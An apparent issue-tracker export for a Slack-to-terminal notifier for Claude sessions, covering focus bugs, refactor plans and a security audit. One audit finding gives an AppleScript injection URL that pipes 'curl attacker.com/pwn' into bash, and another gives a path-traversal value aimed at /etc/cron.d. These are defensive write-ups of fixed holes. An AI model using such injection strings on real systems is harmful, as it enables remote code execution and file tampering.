{"id":"csn-0d7","title":"Fix iTerm2 focus fight during thread replies","description":"## Problem\nWhen sending Slack thread replies to Mac iTerm2 sessions, the focus-helper experiences a \"focus fight\" where another window (often the current Claude session's terminal) keeps reclaiming focus, causing:\n1. Text sent to wrong terminal\n2. Glitchy switching between windows\n\n## Root Cause\nThe AppleScript tries to focus the target window, but something else (likely the active Claude session) keeps reclaiming focus before input can be sent.\n\n## Current State (as of 2026-01-23)\n\n### Fixes Implemented\n1. **Event deduplication** (mcp-server/src/routes/slack.ts, mcp-server/src/remote-relay.ts)\n   - In-memory cache with 1-minute TTL\n   - Prevents Slack retry duplicates\n\n2. **Focus check before input** (bin/focus-helper)\n   - If switch_iterm_session returns FOCUS_FAILED, skip send_iterm_input\n   - Prevents sending to wrong window\n\n3. **Proper session targeting** (bin/focus-helper)\n   - Uses session UUID from $ITERM_SESSION_ID\n   - Selects session, brings window to front, activates iTerm2, waits 0.15s\n\n### Log Evidence\n```\nFOCUS_FAILED: Requested window id 110048 but front window has different id after 3 attempts\nSkipping input - focus failed\n```\n\n## Remaining Issue\nThe focus fight itself is not solved - we just avoid sending to wrong window. Possible solutions to explore:\n\n1. **Longer delays** - Wait longer after activate for focus to settle\n2. **Retry with backoff** - Try more than 3 times with increasing delays\n3. **Different approach** - Instead of relying on frontmost window:\n   - Use iTerm2's `write text` directly to session (but Enter key still needs System Events)\n   - Or use iTerm2's `tell session to select` without changing window order\n4. **Detect competing focus** - Log what window IS frontmost when focus fails\n5. **User notification** - When focus fails, send Slack ephemeral message saying \"couldn't focus, try manually\"\n\n## Files Involved\n- bin/focus-helper: switch_iterm_session(), send_iterm_input()\n- mcp-server/src/routes/slack.ts: /slack/events handler\n- mcp-server/src/remote-relay.ts: /slack/events handler\n- docs/architecture-flows.md: Documentation of the flow\n\n## To Test\n1. Start Claude in one iTerm2 tab\n2. Send notification from Mac session\n3. Reply to thread from Slack\n4. Observe if correct terminal receives input","status":"closed","priority":2,"issue_type":"bug","created_at":"2026-01-23T15:52:24.371872196-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T17:58:03.082909214-08:00","closed_at":"2026-01-23T17:58:03.082909214-08:00","close_reason":"Fixed: tmux index detection (fe9f7a3, f51bfb3) and auto-restart of unhealthy tunnel (97be79b)","comments":[{"id":1,"issue_id":"csn-0d7","author":"playerzer0x","text":"Multiple tmux session focus fight: User has both remote (via claude-slack-notify remote) and local (via launch) sessions. Clicking Slack button for one causes rapid focus switching between both iTerm windows. Fixes: commits fe9f7a3 and f51bfb3 detect actual tmux window/pane indices (respecting base-index 1 and pane-base-index 1). Remaining: user needs to update script, clean 100+ stale link files in ~/.claude/links/, and restart tunnel.","created_at":"2026-01-24T01:43:36Z"},{"id":2,"issue_id":"csn-0d7","author":"playerzer0x","text":"Fixed auto-restart of local-tunnel in launch command (commit 97be79b). Now tests actual tunnel health via /health endpoint instead of just checking if processes exist. If tunnel is unhealthy, stops and restarts it, waiting up to 10 seconds for it to be ready.","created_at":"2026-01-24T01:57:58Z"}]}
{"id":"csn-1i7","title":"Add heartbeat jitter to prevent thundering herd","description":"Add 0-5s random jitter to heartbeat interval. Prevents all clients from re-registering simultaneously after relay restart. See docs/public-relay-plan.md Heartbeat Registration section.","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-23T12:31:24.547510001-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:31:24.547510001-08:00","dependencies":[{"issue_id":"csn-1i7","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:31:31.505292832-08:00","created_by":"playerzer0x"},{"issue_id":"csn-1i7","depends_on_id":"csn-8jz","type":"blocks","created_at":"2026-01-23T12:31:39.460166276-08:00","created_by":"playerzer0x"}]}
{"id":"csn-1qg","title":"[Phase 3] Cleanup focus-helper (minimal changes)","description":"# focus-helper Cleanup\n\n## Goal\nMinimal cleanup of focus-helper. **No behavior changes.**\n\n**Current**: 947 lines\n**Target**: ~750 lines (~20% reduction)\n\n## Safe to Change (cleanup only)\n\n### 1. Remove duplicated logging setup (~30 lines)\n```bash\n# Before: repeated in multiple functions\nlog() {\n  echo \"[$(date '+%Y-%m-%d %H:%M:%S')] $*\" \u003e\u003e \"$LOG_FILE\"\n}\n\n# After: single definition at top\n```\n\n### 2. Simplify URL parsing (~50 lines)\n```bash\n# Before: manual string splitting\nTYPE=$(echo \"$URL\" | sed 's|claude-focus://\\([^/]*\\)/.*|\\1|')\n\n# After: use bash parameter expansion\nURL_PATH=\"${URL#claude-focus://}\"\nTYPE=\"${URL_PATH%%/*}\"\n```\n\n### 3. Consolidate error handling (~40 lines)\n```bash\n# Before: repeated exit patterns\nif [[ -z \"$TARGET\" ]]; then\n  log \"ERROR: no target\"\n  exit 1\nfi\n\n# After: die() helper\ndie() { log \"ERROR: $1\"; exit 1; }\n[[ -z \"$TARGET\" ]] \u0026\u0026 die \"no target\"\n```\n\n### 4. Remove dead code paths (~30 lines)\n- Unused legacy URL formats (if any)\n- Commented-out debug code\n- Unreachable branches\n\n## DO NOT CHANGE\n\n### Critical Functions (preserved exactly)\n- `switch_iterm_session()` - minimization approach\n- `send_iterm_input()` - System Events key code 36\n- `send_terminal_input()` - Terminal.app handling\n- `send_local_tmux_input()` - gastown pattern\n- `send_ssh_tmux_input()` - SSH + gastown pattern\n\n### Critical Timing Values\n- `sleep 0.5` (500ms paste delay)\n- `delay 0.2` (AppleScript minimization delay)\n- `delay 0.15` (focus settle delay)\n- `sleep 0.1` (100ms Escape-to-Enter delay)\n\n### Critical Paths\n- TMUX_SOCKET detection (platform-specific)\n- iTerm session ID matching\n- Window minimization/restoration sequence\n\n## Acceptance Criteria\n- [ ] All E2E tests pass (especially Mac tests)\n- [ ] `test-gastown-pattern.sh` passes\n- [ ] `test-focus-minimization.sh` passes\n- [ ] No behavioral changes (same input → same output)\n- [ ] ~200 lines reduced\n\n## Testing\n```bash\n# MUST pass before and after:\n./tests/e2e/run-tests.sh mac\n./tests/e2e/mac/test-gastown-pattern.sh\n./tests/e2e/mac/test-focus-minimization.sh\n```\n\n## Dependencies\n- csn-xlm (Mac E2E tests must exist first)\n\n## Part of Epic\ncsn-ohz (v2.0 Refactor)","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-24T07:58:55.694257524-08:00","created_by":"playerzer0x","updated_at":"2026-01-24T07:58:55.694257524-08:00","dependencies":[{"issue_id":"csn-1qg","depends_on_id":"csn-xlm","type":"blocks","created_at":"2026-01-24T07:59:21.633435867-08:00","created_by":"playerzer0x"}]}
{"id":"csn-1t3","title":"MEDIUM: Path traversal in instance file","description":"INSTANCE_ID from CLAUDE_INSTANCE_ID env var is used directly in file path in bin/claude-slack-notify:10-12.\n\n**Risk**: Setting CLAUDE_INSTANCE_ID=../../etc/cron.d/pwn could write files outside the intended directory.\n\n**Fix**: Validate that INSTANCE_ID contains only alphanumeric characters: [[ \"$INSTANCE_ID\" =~ ^[a-zA-Z0-9_-]+$ ]]","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-01-18T14:58:50.51356-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:06:03.449249-08:00","closed_at":"2026-01-18T15:06:03.449249-08:00","close_reason":"Added INSTANCE_ID validation in bin/claude-slack-notify using regex ^[a-zA-Z0-9_-]+$ to only allow alphanumeric, underscore, and hyphen characters. Path traversal attempts (../, dots) are rejected with exit 1."}
{"id":"csn-2p3","title":"HIGH: AppleScript injection in focus-helper","description":"User-controlled values from claude-focus:// URLs are embedded directly into AppleScript without sanitization in bin/focus-helper:34-52 and 63-80.\n\n**Risk**: Attacker can craft URLs with AppleScript escape sequences to execute arbitrary shell commands.\n\n**Example**: claude-focus://iterm2/\"; do shell script \"curl attacker.com/pwn|bash\"; return \"\n\n**Fix**: Sanitize URL params before embedding in AppleScript, or pass values via environment variables.","status":"closed","priority":0,"issue_type":"bug","created_at":"2026-01-18T14:58:34.920487-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:03:57.59462-08:00","closed_at":"2026-01-18T15:03:57.59462-08:00","close_reason":"Added sanitize_applescript() function in bin/focus-helper that validates inputs against a strict allowlist regex (alphanumeric, dash, underscore, dot, slash, colon, equals). Invalid inputs are rejected with exit 1 before reaching AppleScript. Tested with injection attempts - all blocked."}
{"id":"csn-355","title":"LOW: Debug log disclosure in focus-helper","description":"Debug logging in bin/focus-helper:6,19,31 etc. writes to /tmp/focus-debug.log which is world-readable.\n\n**Risk**: Exposes terminal session information, TTY paths, and session IDs to other local users.\n\n**Fix**: Log to ~/.claude/logs/ with proper permissions, or remove debug logging in production.","status":"closed","priority":2,"issue_type":"bug","created_at":"2026-01-18T14:58:55.689117-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:10:25.3345-08:00","closed_at":"2026-01-18T15:10:25.3345-08:00","close_reason":"Moved debug log from world-readable /tmp/focus-debug.log to ~/.claude/logs/focus-debug.log. Directory is created with chmod 700 permissions. All 10 log statements updated to use the secure location."}
{"id":"csn-39n","title":"[Phase 1] Consolidate local-tunnel and remote-tunnel","description":"# Consolidate Tunnel Scripts\n\n## Goal\nMerge local-tunnel (1,785 lines) and remote-tunnel (1,797 lines) into unified tunnel script (~1,500 lines).\n\n**Estimated reduction: ~900 lines (duplicated code)**\n\n## Current Duplication\nBoth scripts share nearly identical code for:\n- Tailscale Funnel setup (~150 lines)\n- Localtunnel fallback (~100 lines)\n- Tunnel selection logic (~50 lines)\n- Healthcheck watchdog (~80 lines)\n- Signal handlers and cleanup (~30 lines)\n- MCP server rebuild detection (~40 lines)\n\n## New Structure\n\n```bash\n# bin/tunnel\n\n#!/usr/bin/env bash\nset -euo pipefail\n\n# ══════════════════════════════════════════════════════════════\n# MODE DETECTION\n# ══════════════════════════════════════════════════════════════\n\nif [[ \"$(uname)\" == \"Darwin\" ]]; then\n    MODE=\"local\"\n    PORT=8463\n    SERVER_TYPE=\"mcp\"\n    URL_FILE=\"$HOME/.claude/.tunnel-url\"\nelse\n    MODE=\"remote\"\n    PORT=8464\n    SERVER_TYPE=\"relay\"\n    URL_FILE=\"$HOME/.claude/.remote-tunnel-url\"\nfi\n\n# Override with flags\nwhile [[ $# -gt 0 ]]; do\n    case $1 in\n        --local) MODE=\"local\"; PORT=8463; SERVER_TYPE=\"mcp\" ;;\n        --remote) MODE=\"remote\"; PORT=8464; SERVER_TYPE=\"relay\" ;;\n        --setup) do_setup; exit ;;\n        --background) BACKGROUND=true ;;\n        --use-tailscale) FORCE_TAILSCALE=true ;;\n        --use-localtunnel) FORCE_LOCALTUNNEL=true ;;\n        *) echo \"Unknown: $1\"; exit 1 ;;\n    esac\n    shift\ndone\n\n# ══════════════════════════════════════════════════════════════\n# SHARED FUNCTIONS (previously duplicated)\n# ══════════════════════════════════════════════════════════════\n\nsetup_tailscale_funnel() { ... }   # ~150 lines\nsetup_localtunnel() { ... }        # ~100 lines\nstart_mcp_server() { ... }         # ~50 lines\nstart_remote_relay() { ... }       # ~50 lines\nhealthcheck_loop() { ... }         # ~80 lines\ncleanup() { ... }                  # ~30 lines\ncheck_port_conflict() { ... }      # ~20 lines\n\n# ══════════════════════════════════════════════════════════════\n# MODE-SPECIFIC ENTRY\n# ══════════════════════════════════════════════════════════════\n\nif [[ \"$MODE\" == \"local\" ]]; then\n    start_mcp_server\nelse\n    start_remote_relay\nfi\n\nselect_tunnel_backend\nstart_tunnel\nhealthcheck_loop\n```\n\n## Compatibility Symlinks\n```bash\nln -sf tunnel local-tunnel\nln -sf tunnel remote-tunnel\n```\n\n## Acceptance Criteria\n- [ ] `tunnel` works on Mac (starts MCP server on 8463)\n- [ ] `tunnel` works on Linux (starts relay on 8464)\n- [ ] `local-tunnel` symlink works identically to before\n- [ ] `remote-tunnel` symlink works identically to before\n- [ ] All E2E tests pass after consolidation\n- [ ] `--setup`, `--background` flags work\n- [ ] Tailscale/Localtunnel selection works\n\n## Testing\n```bash\n# On Mac:\n./bin/tunnel              # Should start local mode\n./bin/local-tunnel        # Should work via symlink\n\n# On Linux:\n./bin/tunnel              # Should start remote mode\n./bin/remote-tunnel       # Should work via symlink\n\n# E2E:\n./tests/e2e/run-tests.sh cross-machine\n```\n\n## Dependencies\n- csn-8wn (E2E test runner - need tests to verify)\n- csn-5a7 (Linux E2E tests)\n- csn-xlm (Mac E2E tests)\n\n## Part of Epic\ncsn-ohz (v2.0 Refactor)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-24T07:57:27.151669775-08:00","created_by":"playerzer0x","updated_at":"2026-01-24T07:57:27.151669775-08:00","dependencies":[{"issue_id":"csn-39n","depends_on_id":"csn-5a7","type":"blocks","created_at":"2026-01-24T07:59:21.52990312-08:00","created_by":"playerzer0x"},{"issue_id":"csn-39n","depends_on_id":"csn-xlm","type":"blocks","created_at":"2026-01-24T07:59:21.551236465-08:00","created_by":"playerzer0x"}]}
{"id":"csn-3wz","title":"[Phase 4] Compile unified binary and create symlinks","description":"# Unified Binary Compilation\n\n## Goal\nCompile TypeScript CLI to single binary, create compatibility symlinks.\n\n## Build Command\n```bash\ncd cli \u0026\u0026 bun build src/index.ts --compile --outfile ../bin/claude-notify\n```\n\n## Final bin/ Structure\n```\nbin/\n├── claude-notify              # Compiled Bun binary (main CLI)\n├── tunnel                     # Unified tunnel script (bash)\n├── focus-helper               # AppleScript wrapper (bash, preserved)\n├── local-tunnel -\u003e tunnel     # Compat symlink\n├── remote-tunnel -\u003e tunnel    # Compat symlink\n└── claude-slack-notify -\u003e claude-notify  # Compat symlink\n```\n\n## Symlink Commands\n```bash\ncd bin\nln -sf tunnel local-tunnel\nln -sf tunnel remote-tunnel\nln -sf claude-notify claude-slack-notify\n```\n\n## Update install.sh\n```bash\n# Add to install.sh:\n\n# Compile CLI if bun available\nif command -v bun \u0026\u003e/dev/null; then\n  echo \"Compiling TypeScript CLI...\"\n  (cd cli \u0026\u0026 bun install \u0026\u0026 bun run build)\nfi\n\n# Create symlinks\nln -sf tunnel local-tunnel\nln -sf tunnel remote-tunnel\nln -sf claude-notify claude-slack-notify\n```\n\n## Binary Size Target\n- Target: \u003c 50MB (Bun single-binary is ~40MB base)\n- Verify with: `ls -lh bin/claude-notify`\n\n## Acceptance Criteria\n- [ ] `bun run build` creates bin/claude-notify\n- [ ] Binary runs without Bun installed\n- [ ] `claude-slack-notify` symlink works (backwards compat)\n- [ ] `local-tunnel` and `remote-tunnel` symlinks work\n- [ ] install.sh updated to compile CLI\n- [ ] All E2E tests pass with compiled binary\n\n## Testing\n```bash\n# Verify binary works standalone\n./bin/claude-notify --version\n./bin/claude-notify register --help\n./bin/claude-notify notify -m \"test\"\n\n# Verify symlinks\n./bin/claude-slack-notify --version\n./bin/local-tunnel --help\n./bin/remote-tunnel --help\n\n# Full E2E\n./tests/e2e/run-tests.sh all\n```\n\n## Dependencies\n- csn-39n (consolidated tunnel)\n- csn-m64 (CLI commands)\n- csn-q73 (terminal adapters)\n- csn-1qg (focus-helper cleanup)\n\n## Part of Epic\ncsn-ohz (v2.0 Refactor)","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-24T07:59:09.041235786-08:00","created_by":"playerzer0x","updated_at":"2026-01-24T07:59:09.041235786-08:00","dependencies":[{"issue_id":"csn-3wz","depends_on_id":"csn-39n","type":"blocks","created_at":"2026-01-24T07:59:21.655035484-08:00","created_by":"playerzer0x"},{"issue_id":"csn-3wz","depends_on_id":"csn-m64","type":"blocks","created_at":"2026-01-24T07:59:21.676068458-08:00","created_by":"playerzer0x"},{"issue_id":"csn-3wz","depends_on_id":"csn-q73","type":"blocks","created_at":"2026-01-24T07:59:21.696446774-08:00","created_by":"playerzer0x"},{"issue_id":"csn-3wz","depends_on_id":"csn-1qg","type":"blocks","created_at":"2026-01-24T07:59:21.717120046-08:00","created_by":"playerzer0x"}]}
{"id":"csn-4jc","title":"Modify claude-slack-notify for hybrid buttons","description":"Detect if MCP server is running (check ~/.claude/mcp-server.pid), emit hybrid buttons with both url AND action_id/value, keep url for desktop fallback","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T14:24:46.754858-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T14:39:59.93804-08:00","closed_at":"2026-01-19T14:39:59.93804-08:00","close_reason":"Added hybrid button support with action_id/value for mobile Slack","dependencies":[{"issue_id":"csn-4jc","depends_on_id":"csn-65z","type":"parent-child","created_at":"2026-01-19T14:24:59.467672-08:00","created_by":"playerzer0x"},{"issue_id":"csn-4jc","depends_on_id":"csn-on2","type":"blocks","created_at":"2026-01-19T14:25:11.461301-08:00","created_by":"playerzer0x"}]}
{"id":"csn-5a7","title":"[Phase 0] Create Linux E2E tests","description":"# Linux E2E Tests\n\n## Files to Create\n\n```\ntests/e2e/linux/\n├── test-registration.sh        # Session registration flow\n├── test-notification.sh        # Notification delivery\n├── test-button-input.sh        # Button click → tmux input\n├── test-thread-reply.sh        # Thread reply routing\n├── test-button-value-length.sh # Edge case: long hostnames (\u003c 2000 chars)\n├── test-session-race.sh        # Race: file write vs button click\n└── test-tmux-socket-path.sh    # Verify /tmp/tmux-UID/default\n```\n\n## Test Details\n\n### test-registration.sh\n1. Run `claude-slack-notify register` in test tmux session\n2. Verify instance file created in ~/.claude/instances/\n3. Verify instance file contains correct focus_url\n4. Verify instance file contains term_target\n\n### test-notification.sh\n1. Register test session\n2. Run `claude-slack-notify notify --message \"Test\"`\n3. Verify mock-slack-server received webhook\n4. Verify payload contains expected fields\n\n### test-button-input.sh\n1. Register test session\n2. Create mock button click payload\n3. POST to localhost:8464/slack/actions\n4. Verify tmux pane received the input text\n\n### test-thread-reply.sh\n1. Register test session\n2. Send notification (creates thread file)\n3. Simulate thread reply event\n4. Verify tmux pane received reply text\n\n### test-button-value-length.sh (Edge Case)\n```bash\nLONG_HOST=\"very-long-hostname-that-could-cause-issues.example.com\"\nLONG_SESSION=\"PROJ-12345-feature-implementation-refactor-phase-2\"\n# Generate button value, assert \u003c 2000 chars\n```\n\n### test-session-race.sh (Race Condition)\n1. Start notification in background\n2. Immediately (50ms) simulate button click\n3. Verify graceful handling (no crash)\n\n### test-tmux-socket-path.sh\n1. Verify TMUX_SOCKET is /tmp/tmux-$(id -u)/default on Linux\n2. Verify socket file exists\n3. Verify tmux commands work with this socket\n\n## Acceptance Criteria\n- [ ] All 7 tests pass on Linux server\n- [ ] Tests are idempotent (can run multiple times)\n- [ ] Tests clean up after themselves\n\n## Dependencies\n- csn-8wn (E2E test runner and lib)\n\n## Part of Epic\ncsn-ohz (v2.0 Refactor)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-24T07:56:37.598730547-08:00","created_by":"playerzer0x","updated_at":"2026-01-24T07:56:37.598730547-08:00","dependencies":[{"issue_id":"csn-5a7","depends_on_id":"csn-8wn","type":"blocks","created_at":"2026-01-24T07:59:21.422705691-08:00","created_by":"playerzer0x"}]}
{"id":"csn-5bn","title":"MEDIUM: JSON injection in Slack message","description":"User input from $1 (MESSAGE) and $2 (INSTANCE_NAME) is embedded directly into JSON in bin/claude-slack-notify:226-244.\n\n**Risk**: If message contains quotes or backslashes, it could break JSON structure or inject fields.\n\n**Fix**: Use jq to safely construct JSON: jq -n --arg msg \"$MESSAGE\" '{text: $msg}'","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-01-18T14:58:45.948203-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:07:28.913223-08:00","closed_at":"2026-01-18T15:07:28.913223-08:00","close_reason":"Added json_escape() function that properly escapes backslashes, double quotes, newlines, carriage returns, and tabs. All user-controllable values (INSTANCE_NAME, HOSTNAME, LOCATION, MESSAGE, FOCUS_URL) are now escaped before JSON embedding. Verified with Python json.load() that output is valid JSON."}
{"id":"csn-5iv","title":"Deploy public-relay to Railway","description":"Create Dockerfile and railway.toml. Deploy to Railway with Redis addon. Set up custom domain or use railway.app subdomain. See docs/public-relay-plan.md Hosting Options section.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-23T12:23:38.242587247-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:23:38.242587247-08:00","dependencies":[{"issue_id":"csn-5iv","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:24:02.008338915-08:00","created_by":"playerzer0x"},{"issue_id":"csn-5iv","depends_on_id":"csn-crr","type":"blocks","created_at":"2026-01-23T12:24:06.298062729-08:00","created_by":"playerzer0x"},{"issue_id":"csn-5iv","depends_on_id":"csn-evj","type":"blocks","created_at":"2026-01-23T12:24:06.31364214-08:00","created_by":"playerzer0x"},{"issue_id":"csn-5iv","depends_on_id":"csn-5jh","type":"blocks","created_at":"2026-01-23T12:31:35.483133614-08:00","created_by":"playerzer0x"},{"issue_id":"csn-5iv","depends_on_id":"csn-wmf","type":"blocks","created_at":"2026-01-23T12:31:35.503799782-08:00","created_by":"playerzer0x"},{"issue_id":"csn-5iv","depends_on_id":"csn-dpx","type":"blocks","created_at":"2026-01-23T12:31:35.523765144-08:00","created_by":"playerzer0x"}]}
{"id":"csn-5jh","title":"Add relay-to-tunnel authentication (tunnel secret)","description":"CRITICAL SECURITY: Generate per-tunnel secret during --public-relay setup. Store in ~/.claude/.relay-tunnel-secret. Include in registration. Relay forwards with X-Relay-Secret header. Local MCP verifies. Without this, anyone who discovers a tunnel URL can send fake button clicks. See docs/public-relay-plan.md Security Model section 2.","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-23T12:31:08.156052406-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:31:08.156052406-08:00","dependencies":[{"issue_id":"csn-5jh","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:31:31.421891281-08:00","created_by":"playerzer0x"},{"issue_id":"csn-5jh","depends_on_id":"csn-c4x","type":"blocks","created_at":"2026-01-23T12:31:35.400455393-08:00","created_by":"playerzer0x"}]}
{"id":"csn-641","title":"[Phase 2] Implement CLI lib modules","description":"# CLI Lib Modules\n\n## Files to Create\n\n```\ncli/src/lib/\n├── slack-formatter.ts      # TOOL_FORMATTER replacement\n├── button-value.ts         # Generate url:claude-focus://... values\n├── terminal-detection.ts   # Detect terminal type, build focus URLs\n├── session-store.ts        # Read/write instance files (shared with MCP)\n├── focus-url.ts            # Parse and build focus URLs\n└── platform.ts             # Platform detection utilities\n```\n\n## slack-formatter.ts\nReplace 150-line jq TOOL_FORMATTER with TypeScript:\n\n```typescript\ninterface ToolUse {\n  name: string;\n  input: Record\u003cstring, unknown\u003e;\n}\n\nexport function formatToolCall(tool: ToolUse, prefix: '⏳' | '●' | '❓' = '⏳'): string {\n  switch (tool.name) {\n    case 'AskUserQuestion':\n      return formatQuestion(tool.input, prefix);\n    case 'Bash':\n      return `${prefix} Bash: ${tool.input.command}${tool.input.description ? ` (${tool.input.description})` : ''}`;\n    case 'Edit':\n      return `${prefix} Edit: ${tool.input.file_path}`;\n    case 'Write':\n      return `${prefix} Write: ${tool.input.file_path}`;\n    case 'Read':\n      return `${prefix} Read: ${tool.input.file_path}`;\n    case 'Glob':\n      return `${prefix} Glob: ${tool.input.pattern}${tool.input.path ? ` in ${tool.input.path}` : ''}`;\n    case 'Grep':\n      return `${prefix} Grep: ${tool.input.pattern}${tool.input.path ? ` in ${tool.input.path}` : ''}`;\n    case 'Task':\n      return `${prefix} Task (${tool.input.subagent_type}): ${tool.input.description}`;\n    case 'WebFetch':\n      return `${prefix} WebFetch: ${tool.input.url}`;\n    case 'WebSearch':\n      return `${prefix} WebSearch: ${tool.input.query}`;\n    case 'Skill':\n      return `${prefix} Skill: /${tool.input.skill}`;\n    // ... all 15+ tool types\n  }\n}\n\nfunction formatQuestion(input: Record\u003cstring, unknown\u003e, prefix: string): string {\n  const questions = input.questions as Array\u003c{question: string; options: Array\u003c{label: string; description: string}\u003e}\u003e;\n  if (!questions?.length) return `${prefix} Question`;\n  \n  const q = questions[0];\n  let result = `❓ ${q.question}\\n`;\n  q.options.forEach((opt, i) =\u003e {\n    result += `   ${i + 1}. ${opt.label}${opt.description ? ` - ${opt.description}` : ''}\\n`;\n  });\n  return result.trim();\n}\n```\n\n## terminal-detection.ts\n```typescript\ninterface SessionInfo {\n  termType: 'iterm2' | 'terminal' | 'local-tmux' | 'ssh-linked' | 'tmux' | 'unknown';\n  focusUrl: string;\n  termTarget: string;\n  itermSessionId?: string;\n}\n\nexport function detectTerminal(): SessionInfo {\n  // Check env vars in order of specificity\n  if (process.env.CLAUDE_TMUX_SESSION) {\n    // local-tmux mode (launched via claude-slack-notify launch)\n    const tmuxTarget = process.env.CLAUDE_TMUX_SESSION;\n    const itermId = process.env.CLAUDE_ITERM_SESSION_ID;\n    \n    if (itermId) {\n      return {\n        termType: 'local-tmux',\n        focusUrl: `claude-focus://local-tmux/${encodeURIComponent(itermId)}/${encodeURIComponent(tmuxTarget)}`,\n        termTarget: tmuxTarget,\n        itermSessionId: itermId,\n      };\n    }\n    // ... fallback to old format\n  }\n  \n  if (process.env.ITERM_SESSION_ID) {\n    // Direct iTerm2\n  }\n  \n  // ... etc\n}\n```\n\n## button-value.ts\n```typescript\nconst MAX_BUTTON_VALUE_LENGTH = 2000;  // Slack limit\n\nexport function buildButtonValue(focusUrl: string, action: string): string {\n  const value = `url:${focusUrl}|${action}`;\n  \n  if (value.length \u003e MAX_BUTTON_VALUE_LENGTH) {\n    throw new Error(`Button value exceeds Slack limit: ${value.length} \u003e ${MAX_BUTTON_VALUE_LENGTH}`);\n  }\n  \n  return value;\n}\n```\n\n## Acceptance Criteria\n- [ ] slack-formatter.ts handles all 15+ tool types\n- [ ] terminal-detection.ts correctly detects all terminal types\n- [ ] button-value.ts validates length limits\n- [ ] Unit tests for each module\n- [ ] Can be imported by MCP server (shared code)\n\n## Dependencies\n- csn-ay1 (CLI structure)\n\n## Part of Epic\ncsn-ohz (v2.0 Refactor)","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-24T07:58:00.246273696-08:00","created_by":"playerzer0x","updated_at":"2026-01-24T07:58:00.246273696-08:00","dependencies":[{"issue_id":"csn-641","depends_on_id":"csn-ay1","type":"blocks","created_at":"2026-01-24T07:59:21.572760208-08:00","created_by":"playerzer0x"}]}
{"id":"csn-654","title":"Add interactive webhook URL prompting in install.sh","description":"Instead of just showing instructions, prompt user to paste webhook URL directly during install. Validate URL format and save to ~/.claude/slack-webhook-url.","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T16:25:22.701264-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T16:31:49.517615-08:00","closed_at":"2026-01-19T16:31:49.517615-08:00","close_reason":"Added interactive webhook URL prompting with validation","dependencies":[{"issue_id":"csn-654","depends_on_id":"csn-82z","type":"parent-child","created_at":"2026-01-19T16:26:02.354335-08:00","created_by":"playerzer0x"}]}
{"id":"csn-655","title":"Fix stale PID file issue on remote-tunnel relay","description":"## Problem\nThe remote-tunnel relay shows 'stale PID file' when checking status, requiring manual restart.\n\n## Evidence\nRelay: Stopped (stale PID file: 2480891)\n\n## Possible Causes\n1. Relay process crashed without cleaning up PID file\n2. Watchdog not detecting/cleaning stale PIDs\n3. Process killed externally (OOM, signal) without cleanup\n\n## Investigation Steps\n- Check if relay has proper signal handlers (SIGTERM, SIGINT)\n- Check if watchdog validates PID file against running processes\n- Add automatic stale PID detection and cleanup\n- Consider using process group or lockfile instead of PID file\n\n## Acceptance Criteria\n- Stale PID files are automatically detected and cleaned\n- Relay restarts cleanly after unexpected termination","status":"in_progress","priority":2,"issue_type":"bug","created_at":"2026-01-22T03:30:41.751211251-08:00","created_by":"playerzer0x","updated_at":"2026-01-22T04:07:50.901378-08:00"}
{"id":"csn-65z","title":"MCP Server for Slack Mobile Support","description":"Build an MCP server that replaces the current macOS URL handler system and enables mobile Slack button support. Eliminates polling daemon, enables mobile buttons via HTTPS, provides MCP tools for Claude.","status":"closed","priority":1,"issue_type":"epic","created_at":"2026-01-19T14:24:31.400448-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T14:45:13.6966-08:00","closed_at":"2026-01-19T14:45:13.6966-08:00","close_reason":"Core MCP server implementation complete: server, tools, Slack endpoint, hybrid buttons, signature verification. 20 tests passing. Documentation task remaining."}
{"id":"csn-65z.1","title":"Run tests and verify MCP server functionality","description":"Run bun test, verify server starts, test Slack endpoint manually, test MCP tools","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T14:28:30.358053-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T14:45:02.647891-08:00","closed_at":"2026-01-19T14:45:02.647891-08:00","close_reason":"All 20 tests passing across 2 test files","dependencies":[{"issue_id":"csn-65z.1","depends_on_id":"csn-65z","type":"parent-child","created_at":"2026-01-19T14:28:30.358591-08:00","created_by":"playerzer0x"},{"issue_id":"csn-65z.1","depends_on_id":"csn-c8z","type":"blocks","created_at":"2026-01-19T14:28:35.290556-08:00","created_by":"playerzer0x"},{"issue_id":"csn-65z.1","depends_on_id":"csn-4jc","type":"blocks","created_at":"2026-01-19T14:28:35.353197-08:00","created_by":"playerzer0x"}]}
{"id":"csn-6r2","title":"Fix unbound variable error in install.sh:359","description":"install.sh line 359 uses '$1' instead of '${1:-}', causing 'unbound variable' error when no argument is passed. One-line fix.","status":"closed","priority":0,"issue_type":"bug","created_at":"2026-01-19T16:25:09.885213-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T16:29:47.552896-08:00","closed_at":"2026-01-19T16:29:47.552896-08:00","close_reason":"Fixed","dependencies":[{"issue_id":"csn-6r2","depends_on_id":"csn-82z","type":"parent-child","created_at":"2026-01-19T16:26:02.327287-08:00","created_by":"playerzer0x"}]}
